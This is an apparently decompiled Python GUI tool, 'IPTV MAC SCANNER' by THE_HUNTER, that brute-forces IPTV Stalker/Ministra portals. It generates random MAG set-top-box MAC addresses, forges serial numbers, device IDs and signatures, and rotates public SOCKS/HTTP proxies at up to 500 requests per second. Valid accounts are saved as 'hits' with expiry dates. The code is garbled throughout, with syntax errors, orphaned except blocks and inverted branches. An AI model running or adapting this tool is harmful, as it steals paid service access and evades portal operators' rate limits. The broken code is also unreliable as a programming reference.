

global proxy_failures  # inserted
global external_proxies  # inserted
global total_checked  # inserted
global hit_count  # inserted
global threads  # inserted
global working_proxies  # inserted
global last_proxy_reload_time  # inserted
global scanning  # inserted
import tkinter as tk
from tkinter import filedialog, scrolledtext, messagebox, ttk
import threading
import time
import random
import requests
import json
import os
import logging
import hashlib
import urllib.parse
hit_count = 0
scanning = False
total_checked = 0
external_proxies = []
working_proxies = []
last_proxy_reload_time = time.time()
threads = []
lock = threading.Lock()
proxy_failures = {}
logging.basicConfig(filename='iptv_scanner.log', level=logging.ERROR, format='%(asctime)s - %(levelname)s - %(message)s')

def read_proxies_from_file(proxy_file):
    proxies = []
    if proxy_file and os.path.exists(proxy_file):
        with open(proxy_file, 'r', encoding='utf-8') as f:
            for line in f:
                proxy = line.strip()
                if proxy:
                    pass  # postinserted
                else:  # inserted
                    proxy = 'http://' + proxy if not proxy.startswith(('http://', 'https://', 'socks4://', 'socks5://')) else proxy
                    proxies.append(proxy)
            return proxies

def load_proxies_from_json(json_file):
    proxies = []
    if json_file and os.path.exists(json_file):
        with open(json_file, 'r', encoding='utf-8') as f:
            data = json.load(f)
            if isinstance(data, list):
                proxies = data
            return proxies

def load_external_proxies(url, protocol):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            proxies = [f'{protocol}{proxy}' for proxy in proxies if proxy.strip()]
                return proxies
    except Exception as e:
        messagebox.showerror('Error', f'An error occurred: {str(e)}')

def load_socks4():
    global external_proxies  # inserted
    external_proxies = load_external_proxies('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt', 'socks4://')
    messagebox.showinfo('Loaded', f'Loaded {len(external_proxies)} SOCKS4 proxies.')

def load_socks5():
    global external_proxies  # inserted
    external_proxies = load_external_proxies('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt', 'socks5://')
    messagebox.showinfo('Loaded', f'Loaded {len(external_proxies)} SOCKS5 proxies.')

def load_http():
    global external_proxies  # inserted
    external_proxies = load_external_proxies('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt', 'http://')
    messagebox.showinfo('Loaded', f'Loaded {len(external_proxies)} HTTP proxies.')

def load_proxies_from_api(api_url):
    try:
        response = requests.get(api_url, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return data if isinstance(data, list) else data['proxies'] if isinstance(data, dict) and 'proxies' in data else []
    except Exception as e:
        messagebox.showerror('Error', f'An error occurred: {str(e)}')

def reload_proxies():
    global external_proxies  # inserted
    global last_proxy_reload_time  # inserted
    if external_proxy_var.get():
        external_proxies = load_external_proxies('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt', 'http://')
        last_proxy_reload_time = time.time()
        status_text.insert(tk.END, 'Proxies reloaded.\n')
    return None

def test_proxy():
    proxy = proxy_test_entry.get()
    portal = proxy_portal_entry.get()
    success_keyword = success_keyword_entry.get()
    if not proxy or not portal or (not success_keyword):
        messagebox.showerror('Error', 'Please enter proxy, portal URL, and success keyword.')
    return None

def test_proxy_list():
    portal = proxy_portal_entry.get()
    success_keyword = success_keyword_entry.get()
    proxy_file = proxy_list_entry.get()
    if not portal or not success_keyword or (not proxy_file):
        messagebox.showerror('Error', 'Please enter portal URL, success keyword, and select a proxy file.')
    return None

def export_results_to_json(results, filename='results.json'):
    os.makedirs('Results', exist_ok=True)
    with open(os.path.join('Results', filename), 'w', encoding='utf-8') as f:
        json.dump(results, f, indent=4)
    messagebox.showinfo('Export Successful', f'Results exported to {filename}')

def export_working_proxies_to_json(filename='working_proxies.json'):
    os.makedirs('Proxies', exist_ok=True)
    with open(os.path.join('Proxies', filename), 'w', encoding='utf-8') as f:
        json.dump(working_proxies, f, indent=4)
    messagebox.showinfo('Export Successful', f'Working proxies exported to {filename}')

def browse_proxy_list():
    filename = filedialog.askopenfilename()
    if filename:
        proxy_list_entry.delete(0, tk.END)
        proxy_list_entry.insert(0, filename)
    return None

def open_proxy_checker():
    proxy_checker_window = tk.Toplevel(root)
    proxy_checker_window.title('PROXY CHECKER')
    proxy_checker_window.geometry('600x400')
    proxy_test_frame = tk.LabelFrame(proxy_checker_window, text='Proxy Checker', padx=10, pady=10)
    proxy_test_frame.grid(row=0, column=0, padx=10, pady=10, sticky='nsew')
    tk.Label(proxy_test_frame, text='Proxy to Test:').grid(row=0, column=0, sticky='w')
    proxy_test_entry = tk.Entry(proxy_test_frame)
    proxy_test_entry.grid(row=0, column=1, sticky='ew')
    tk.Label(proxy_test_frame, text='Portal URL:').grid(row=1, column=0, sticky='w')
    proxy_portal_entry = tk.Entry(proxy_test_frame)
    proxy_portal_entry.grid(row=1, column=1, sticky='ew')
    tk.Label(proxy_test_frame, text='Success Keyword:').grid(row=2, column=0, sticky='w')
    success_keyword_entry = tk.Entry(proxy_test_frame)
    success_keyword_entry.grid(row=2, column=1, sticky='ew')
    tk.Label(proxy_test_frame, text='Proxy List File:').grid(row=3, column=0, sticky='w')
    proxy_list_entry = tk.Entry(proxy_test_frame)
    proxy_list_entry.grid(row=3, column=1, sticky='ew')
    proxy_list_button = tk.Button(proxy_test_frame, text='Browse', command=browse_proxy_list)
    proxy_list_button.grid(row=3, column=2, sticky='ew')
    test_proxy_button = tk.Button(proxy_test_frame, text='Test Proxy', command=test_proxy)
    test_proxy_button.grid(row=4, column=1, sticky='ew')
    test_proxy_list_button = tk.Button(proxy_test_frame, text='Test Proxy List', command=test_proxy_list)
    test_proxy_list_button.grid(row=4, column=2, sticky='ew')
    tk.Label(proxy_test_frame, text='Load External Proxies:').grid(row=5, column=0, sticky='w')
    socks4_button = tk.Button(proxy_test_frame, text='Load SOCKS4', command=load_socks4)
    socks4_button.grid(row=5, column=1, sticky='ew')
    socks5_button = tk.Button(proxy_test_frame, text='Load SOCKS5', command=load_socks5)
    socks5_button.grid(row=5, column=2, sticky='ew')
    http_button = tk.Button(proxy_test_frame, text='Load HTTP', command=load_http)
    http_button.grid(row=6, column=1, sticky='ew')

def clear_data():
    global working_proxies  # inserted
    global hit_count  # inserted
    global total_checked  # inserted
    global external_proxies  # inserted
    global proxy_failures  # inserted
    portal_entry.delete(0, tk.END)
    portals_entry.delete(0, tk.END)
    proxy_entry.delete(0, tk.END)
    proxy_test_entry.delete(0, tk.END)
    proxy_portal_entry.delete(0, tk.END)
    success_keyword_entry.delete(0, tk.END)
    proxy_list_entry.delete(0, tk.END)
    manual_mac_entry.delete(0, tk.END)
    reload_minutes_entry.delete(0, tk.END)
    max_failures_entry.delete(0, tk.END)
    speed_entry.delete(0, tk.END)
    speed_entry.insert(0, '10')
    status_text.delete(1.0, tk.END)
    hit_count = 0
    total_checked = 0
    external_proxies = []
    working_proxies = []
    proxy_failures = {}
    status_label.config(text='Hits: 0 | Checked: 0 | CPM: 0')
    messagebox.showinfo('Clear Data', 'All data has been cleared.')

def start_scan():
    global scanning  # inserted
    global hit_count  # inserted
    global total_checked  # inserted
    scanning = True
    total_checked = 0
    hit_count = 0
    portal_type = portal_var.get()
    speed = speed_var.get()
    proxy_file = proxy_entry.get()
    multi_scan = multi_scan_var.get()
    use_external_proxies = external_proxy_var.get()
    use_multithreading = multithreading_var.get()
    if multi_scan:
        portals_file = portals_entry.get()
        if portals_file and (not os.path.exists(portals_file)):
            status_text.insert(tk.END, 'Please select a valid portals file.\n')
        with None as f:
            pass  # postinserted
    status_text.insert(tk.END, f'Starting scan on {len(portals)} portals at {speed} req/sec\n')
    if use_multithreading:
        for portal in portals:
            thread = threading.Thread(target=scan_logic, args=(portal, portal_type, speed, proxy_file, use_external_proxies), daemon=True)
            threads.append(thread)
            thread.start()
    return None

def stop_scan():
    global scanning  # inserted
    global threads  # inserted
    scanning = False
    for thread in threads:
        if thread.is_alive():
            pass  # postinserted
        else:  # inserted
            thread.join()
    threads = []
    status_text.insert(tk.END, 'Scan stopped.\n')

def pause_scan():
    global scanning  # inserted
    scanning = not scanning
    status_text.insert(tk.END, 'Scan paused.\n' if not scanning else None, 'Resuming scan...\n')

def browse_proxy_file():
    filename = filedialog.askopenfilename()
    if filename:
        proxy_entry.delete(0, tk.END)
        proxy_entry.insert(0, filename)
    return None

def browse_portals_file():
    filename = filedialog.askopenfilename()
    if filename:
        portals_entry.delete(0, tk.END)
        portals_entry.insert(0, filename)
    return None

def generate_mac():
    return '00:1A:79:' + ':'.join((f'{random.randint(0, 255):02X}' for _ in range(3)))

def get_ip_info():
    try:
        response = requests.get('https://ipinfo.io/json', timeout=10)
        if response.status_code == 200:
            data = response.json()
            return (data.get('ip', 'N/A'), data.get('country', 'N/A'))
    except:
        return ('N/A', 'N/A')

def generate_hashes(mac):
    sn = hashlib.md5(mac.encode()).hexdigest()
    sn_enc = sn.upper()
    sn_cut = sn_enc[:13]
    dev = hashlib.sha256(mac.encode()).hexdigest()
    dev_enc = dev.upper()
    dev2 = hashlib.sha256(sn_cut.encode()).hexdigest()
    dev_enc2 = dev2.upper()
    signature = hashlib.sha256((sn_cut + mac).encode()).hexdigest()
    sign_enc = signature.upper()
    return (sn_enc, sn_cut, dev_enc, dev_enc2, sign_enc)

def send_encrypted_request(portal, portal_type, mac, token):
    sn_enc, sn_cut, dev_enc, dev_enc2, sign_enc = generate_hashes(mac)
    random_value = str(random.randint(100000, 999999))
    data = {'mac': mac, 'sn': sn_enc, 'type': 'STB', 'model': 'MAG250', 'uid': '', 'random': random_value}
    encoded_data = urllib.parse.quote(json.dumps(data))
    current_time = str(int(time.time()))
    url = f'{portal}{portal_type}?type=stb&action=get_profile&hd=1&ver=ImageDescription:%200.2.18-r23-250;%20ImageDate:%20Thu%20Sep%2013%2011:31:16%20EEST%202018;%20PORTAL%20version:%205.3.1;%20API%20Version:%20JS%20API%20version:%20343;%20STB%20API%20version:%20146;%20Player%20Engine%20version:%200x58c&num_banks=2&sn={sn_cut}&stb_type=MAG250&client_type=STB&image_version=218&video_out=hdmi&device_id={dev_enc}&device_id2={dev_enc2}&signature={sign_enc}&auth_second_step=1&hw_version=1.7-BD-00&not_valid_token=0&metrics={encoded_data}&hw_version_2=631be47f51991ebd34b22b70bdba6cf9bc904580&timestamp={current_time}&api_signature=262&prehash=&JsHttpRequest=1-xml'
    headers = {'Cookie': f'mac={mac}; timezone=Africa/Tunis; adid=ce5b89942454f454fd0180da1a29fa12', 'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3', 'X-User-Agent': 'Model: MAG270; Link: WiFi', 'Authorization': f'Bearer {token}', 'Host': portal.split('//')[1].split('/')[0], 'Connection': 'Keep-Alive', 'Accept-Encoding': 'gzip'}
    try:
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            ip = data.get('ip', 'N/A')
            play_token = data.get('play_token', 'N/A')
            return (ip, play_token)
    except Exception as e:
        logging.error(f'An error occurred: {str(e)}')
        return ('N/A', 'N/A')

def save_hit(mac, portal, expiry, ip, country, sn, dev_enc, dev_enc2):
    os.makedirs('Hits', exist_ok=True)
    portal_filename = portal.replace('http://', '').replace('https://', '').split('/')[0].replace(':', '_')
    with open(os.path.join('Hits', f'{portal_filename}.txt'), 'a', encoding='utf-8') as f:
        f.write('╭─➤  🦅 🄸🄿🅃🅅 🄼🄰🄲 🅂🄲🄰🄽🄽🄴🅁 🦅 \n')
        f.write('├➤ 𝗛𝗶𝘁𝘀 ʙʏ 🦅  THE_HUNTER 🦅 \n')
        f.write(f'├➤🦅 Potal ➤ {portal}\n')
        f.write(f'├➤🦅 Portal Type ➤ {portal_var.get()}\n')
        f.write(f'├➤🦅 MAC ➤ {mac}\n')
        f.write(f'├➤🦅 Exp ➤ {expiry}\n')
        f.write(f'├➤🦅 SN ➤ {sn}\n')
        f.write(f'├➤🦅 Device ID 1 ➤ {dev_enc}\n')
        f.write(f'├➤🦅 Device ID 2 ➤ {dev_enc2}\n')
        if country!= 'N/A':
            f.write(f'├➤🦅 CountryCode ➤ {country}\n')
        f.write('╰─➤🦅 𝕀ℙ𝕋𝕍 𝕄𝔸ℂ 𝕊ℂ𝔸ℕℕ𝔼ℝ 𝓑𝓨  ─➤   𝐓𝐇𝐄_𝐇𝐔𝐍𝐓𝐄𝐑 \n')
        f.write('\n▀▄▀▄▀▄ 🆃🅷🅴_🅷🆄🅽🆃🅴🆁 🆇 🆂🆃🆁🅴🅰🅼 🆂🅾🅻🆄🆃🅸🅾🅽🆂 ▄▀▄▀▄▀\n')
        f.write('\n⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱\n')
        f.write('⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱⋰⋱\n\n')

def check_mac_and_log(portal, portal_type, mac_address, headers, proxy=None):
    global hit_count  # inserted
    success, token = check_mac(portal, portal_type, mac_address, headers, proxy)
    if success:
        sn_enc, sn_cut, dev_enc, dev_enc2, sign_enc = generate_hashes(mac_address)
        ip, play_token = send_encrypted_request(portal, portal_type, mac_address, token)
        expiry = fetch_account_info(portal, token, headers, proxy) if success else 'N/A'
        if expiry!= 'N/A':
            with lock:
                hit_count += 1
                ip, country = get_ip_info()
                save_hit(mac_address, portal, expiry, ip, country, sn_enc, dev_enc, dev_enc2)
                status_text.insert(tk.END, f'[HIT] Portal: {portal} | MAC: {mac_address} | Expiry: {expiry} | IP: {ip} | Country: {country} | Total Hits: {hit_count}\n')
        return None
    else:  # inserted
        return None

def check_mac(portal, portal_type, mac, headers, proxy=None):
    portal = 'http://' + portal if not portal.startswith(('http://', 'https://')) else portal
    url = f'{portal}{portal_type}?action=handshake&type=stb&token=&JsHttpRequest=1-xml'
    try:
        if proxy and proxy.startswith(('socks4://', 'socks5://')):
            from urllib3.contrib.socks import SOCKSProxyManager
            proxy_manager = SOCKSProxyManager(proxy)
            res = proxy_manager.request('GET', url, headers=headers, timeout=10)
        if res.status_code == 200 and 'token' in res.text:
            data = json.loads(res.text)
            return (True, data['js']['token'])
    except Exception as e:
        logging.error(f'Error occurred: {str(e)}')
        return (False, None)

def fetch_account_info(portal, token, headers, proxy=None):
    portal_type = portal_var.get()
    url = f'{portal}{portal_type}?type=account_info&action=get_main_info&JsHttpRequest=1-xml'
    headers['Authorization'] = f'Bearer {token}'
    try:
        proxies = {'http': proxy, 'https': proxy} if proxy else None
        res = requests.get(url, headers=headers, timeout=10, proxies=proxies)
        if res.status_code == 200:
            data = json.loads(res.text)
            return data['js'].get('phone', 'N/A')
    except Exception as e:
        logging.error(f'Error fetching account info: {str(e)}')
        return 'N/A'

def check_manual_mac():
    mac_address = manual_mac_entry.get()
    portal = portal_entry.get()
    portal_type = portal_var.get()
    headers = {'User-Agent': 'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34'}
    headers['Cookie'] = f'mac={mac_address}; timezone=Africa/Tunis'
    if mac_address:
        check_mac_and_log(portal, portal_type, mac_address, headers)
    return None

def scan_logic(portal, portal_type, speed, proxy_file, use_external_proxies):
    global total_checked  # inserted
    start_time = time.time()
    headers = {'User-Agent': 'Mozilla/5.0 (compatible; CloudFlare-AlwaysOnline/1.0; +https://www.cloudflare.com/always-online) AppleWebKit/534.34'}
    proxies = []
    if use_proxy_var.get():
        with lock:
            proxies = read_proxies_from_file(proxy_file)
        if use_external_proxies:
            with lock:
                proxies.extend(external_proxies)
        with lock:
            proxies.extend(working_proxies)
    max_failures = int(max_failures_entry.get()) if max_failures_entry.get().isdigit() else 3
    if scanning:
        with lock:
            total_checked += 1
        mac_address = generate_mac()
        headers['Cookie'] = f'mac={mac_address}; timezone=Africa/Tunis'
        proxy = None
        if use_proxy_var.get() and proxies:
            with lock:
                proxy = random.choice(proxies)
        if isinstance(portal, list):
            for p in portal:
                if not p.startswith(('http://', 'https://')):
                    p = 'http://' + p
                print(f'Sending request to: {p}')
                print(f'Headers: {headers}')
                print(f'Proxy: {proxy}')
                try:
                    check_mac_and_log(p, portal_type, mac_address, headers, proxy)
                    if proxy and proxy in proxy_failures:
                        proxy_failures[proxy] = 0
        if use_proxy_var.get():
            reload_minutes = reload_minutes_entry.get()
            if reload_minutes and reload_minutes.isdigit():
                reload_minutes = int(reload_minutes)
                if time.time() - last_proxy_reload_time >= reload_minutes * 60:
                    with lock:
                        reload_proxies()
        elapsed_time = time.time() - start_time
        with lock:
            cpm = int(total_checked / elapsed_time * 60) if elapsed_time > 0 else 0
            status_label.config(text=f'Hits: {hit_count} | Checked: {total_checked} | CPM: {cpm}')
        time.sleep(1 / speed_var.get())
    except Exception as e:
        print(f'Error occurred with proxy {proxy}: {str(e)}')
        if proxy:
            if proxy in proxy_failures:
                proxy_failures[proxy] += 1
            if proxy_failures[proxy] >= max_failures:
                with lock:
                    if proxy in proxies:
                        proxies.remove(proxy)
                        print(f'Removed proxy {proxy} due to exceeding max failures.')
    except Exception as e:
        print(f'Error occurred with proxy {proxy}: {str(e)}')
        if proxy:
            if proxy in proxy_failures:
                proxy_failures[proxy] += 1
            if proxy_failures[proxy] >= max_failures:
                with lock:
                    if proxy in proxies:
                        proxies.remove(proxy)
                        print(f'Removed proxy {proxy} due to exceeding max failures.')
root = tk.Tk()
root.title('IPTV MAC SCANNER v3.1 - Developed by THE_HUNTER')
root.geometry('800x800')
title_frame = tk.Frame(root)
title_frame.grid(row=0, column=0, columnspan=3, pady=10)
tk.Label(title_frame, text='Developed by THE_HUNTER', fg='red', font=('Arial', 12, 'bold')).pack()
settings_frame = tk.LabelFrame(root, text='Basic Settings', padx=10, pady=10)
settings_frame.grid(row=1, column=0, padx=10, pady=10, sticky='nsew')
tk.Label(settings_frame, text='Portal Type:').grid(row=0, column=0, sticky='w')
portal_var = tk.StringVar(value='/portal.php')
portal_options = ['/portal.php', '/server/load.php', '/stalker_portal/server/load.php', '/stalker_u.php', '/BoSSxxxx/portal.php', '/c/portal.php', '/c/server/load.php', '/magaccess/portal.php', '/portalcc.php', '/bs.mag.portal.php', '/magportal/portal.php', '/maglove/portal.php', '/tek/server/load.php', '/emu/server/load.php', '/emu2/server/load.php', '/xx//server/load.php', '/portalott.php', '/ghandi_portal/server/load.php', '/magLoad.php', '/ministra/portal.php', '/portalstb/portal.php', '/xx/portal.php', '/portalmega.php', '/portalmega/portal.php', '/rmxportal/portal.php', '/portalmega/portalmega.php', '/powerfull/portal.php', '/korisnici/server/load.php', '/nettvmag/portal.php', '/cmdforex/portal.php', '/k/portal.php', '/p/portal.php', '/cp/server/load.php', '/extraportal.php', '/Link_Ok/portal.php', '/delko/portal.php', '/delko/server/load.php', '/bStream/portal.php', '/bStream/server/load.php', '/blowportal/portal.php', '/client/portal.php', '/server/move.php']
portal_menu = tk.OptionMenu(settings_frame, portal_var, *portal_options)
portal_menu.grid(row=0, column=1, sticky='ew')
tk.Label(settings_frame, text='Portal:').grid(row=1, column=0, sticky='w')
portal_entry = tk.Entry(settings_frame)
portal_entry.grid(row=1, column=1, sticky='ew')
tk.Label(settings_frame, text='Portals File (for multi-scan):').grid(row=2, column=0, sticky='w')
portals_entry = tk.Entry(settings_frame)
portals_entry.grid(row=2, column=1, sticky='ew')
portals_button = tk.Button(settings_frame, text='Browse', command=browse_portals_file)
portals_button.grid(row=2, column=2, sticky='ew')
multi_scan_var = tk.BooleanVar()
multi_scan_check = tk.Checkbutton(settings_frame, text='Enable Multi-Scan', variable=multi_scan_var)
multi_scan_check.grid(row=3, column=0, columnspan=3, sticky='w')
tk.Label(settings_frame, text='Speed (1-500 req/sec):').grid(row=4, column=0, sticky='w')
speed_var = tk.IntVar(value=10)
speed_slider = ttk.Scale(settings_frame, from_=1, to=500, orient='horizontal', variable=speed_var)
speed_slider.grid(row=4, column=1, sticky='ew')
tk.Label(settings_frame, text='1').grid(row=4, column=1, sticky='w')
tk.Label(settings_frame, text='500').grid(row=4, column=1, sticky='e')
speed_entry = tk.Entry(settings_frame, textvariable=speed_var, width=5)
speed_entry.grid(row=4, column=2, sticky='ew')

def update_speed_slider(event):
    value = speed_entry.get()
    if validate_speed(value):
        speed_var.set(int(value))
    return None
speed_entry.bind('<Return>', update_speed_slider)

def validate_speed(value):
    try:
        value = int(value)
        if 1 <= value <= 500:
            return True
        return False
    except ValueError:
        return False
multithreading_var = tk.BooleanVar()
multithreading_check = tk.Checkbutton(settings_frame, text='Enable Multithreading', variable=multithreading_var)
multithreading_check.grid(row=5, column=0, columnspan=3, sticky='w')
proxy_frame = tk.LabelFrame(root, text='Proxy Settings', padx=10, pady=10)
proxy_frame.grid(row=1, column=1, padx=10, pady=10, sticky='nsew')
tk.Label(proxy_frame, text='Proxy File:').grid(row=0, column=0, sticky='w')
proxy_entry = tk.Entry(proxy_frame)
proxy_entry.grid(row=0, column=1, sticky='ew')
proxy_button = tk.Button(proxy_frame, text='Browse', command=browse_proxy_file)
proxy_button.grid(row=0, column=2, sticky='ew')
external_proxy_var = tk.BooleanVar()
external_proxy_check = tk.Checkbutton(proxy_frame, text='Use External Proxies', variable=external_proxy_var)
external_proxy_check.grid(row=1, column=0, columnspan=3, sticky='w')
tk.Label(proxy_frame, text='Load External Proxies:').grid(row=2, column=0, sticky='w')
socks4_button = tk.Button(proxy_frame, text='Load SOCKS4', command=load_socks4)
socks4_button.grid(row=2, column=1, sticky='ew')
socks5_button = tk.Button(proxy_frame, text='Load SOCKS5', command=load_socks5)
socks5_button.grid(row=2, column=2, sticky='ew')
http_button = tk.Button(proxy_frame, text='Load HTTP', command=load_http)
http_button.grid(row=3, column=1, sticky='ew')
tk.Label(proxy_frame, text='Reload Proxies After (minutes):').grid(row=4, column=0, sticky='w')
reload_minutes_entry = tk.Entry(proxy_frame)
reload_minutes_entry.grid(row=4, column=1, sticky='ew')
use_proxy_var = tk.BooleanVar(value=True)
use_proxy_check = tk.Checkbutton(proxy_frame, text='Use Proxy', variable=use_proxy_var)
use_proxy_check.grid(row=5, column=0, columnspan=3, sticky='w')
tk.Label(proxy_frame, text='Max Proxy Failures Before Removal:').grid(row=6, column=0, sticky='w')
max_failures_entry = tk.Entry(proxy_frame)
max_failures_entry.grid(row=6, column=1, sticky='ew')
max_failures_entry.insert(0, '3')
control_frame = tk.LabelFrame(root, text='Control', padx=10, pady=10)
control_frame.grid(row=2, column=0, columnspan=2, padx=10, pady=10, sticky='nsew')
start_button = tk.Button(control_frame, text='Start', command=start_scan)
start_button.grid(row=0, column=0, padx=5, pady=5, sticky='ew')
pause_button = tk.Button(control_frame, text='Pause', command=pause_scan)
pause_button.grid(row=0, column=1, padx=5, pady=5, sticky='ew')
stop_button = tk.Button(control_frame, text='Stop', command=stop_scan)
stop_button.grid(row=0, column=2, padx=5, pady=5, sticky='ew')
tk.Label(control_frame, text='Manual MAC Address:').grid(row=1, column=0, sticky='w')
manual_mac_entry = tk.Entry(control_frame)
manual_mac_entry.grid(row=1, column=1, sticky='ew')
manual_mac_button = tk.Button(control_frame, text='Check MAC', command=check_manual_mac)
manual_mac_button.grid(row=1, column=2, sticky='ew')
clear_button = tk.Button(control_frame, text='Clear Data', command=clear_data)
clear_button.grid(row=2, column=0, padx=5, pady=5, sticky='ew')
export_results_button = tk.Button(control_frame, text='Export Results to JSON', command=lambda: export_results_to_json(working_proxies))
export_results_button.grid(row=3, column=0, padx=5, pady=5, sticky='ew')
export_proxies_button = tk.Button(control_frame, text='Export Working Proxies to JSON', command=lambda: export_working_proxies_to_json())
export_proxies_button.grid(row=3, column=1, padx=5, pady=5, sticky='ew')
status_frame = tk.LabelFrame(root, text='Status', padx=10, pady=10)
status_frame.grid(row=3, column=0, columnspan=2, padx=10, pady=10, sticky='nsew')
status_label = tk.Label(status_frame, text='Hits: 0 | Checked: 0 | CPM: 0', fg='blue')
status_label.grid(row=0, column=0, sticky='w')
status_text = scrolledtext.ScrolledText(status_frame, height=10, width=70)
status_text.grid(row=1, column=0, columnspan=3, sticky='nsew')
proxy_checker_button = tk.Button(root, text='PROXY CHECKER', command=open_proxy_checker)
proxy_checker_button.grid(row=4, column=0, columnspan=2, pady=10)
root.grid_columnconfigure(0, weight=1)
root.grid_columnconfigure(1, weight=1)
root.grid_rowconfigure(1, weight=1)
root.grid_rowconfigure(2, weight=1)
root.grid_rowconfigure(3, weight=1)
root.grid_rowconfigure(4, weight=1)
root.mainloop()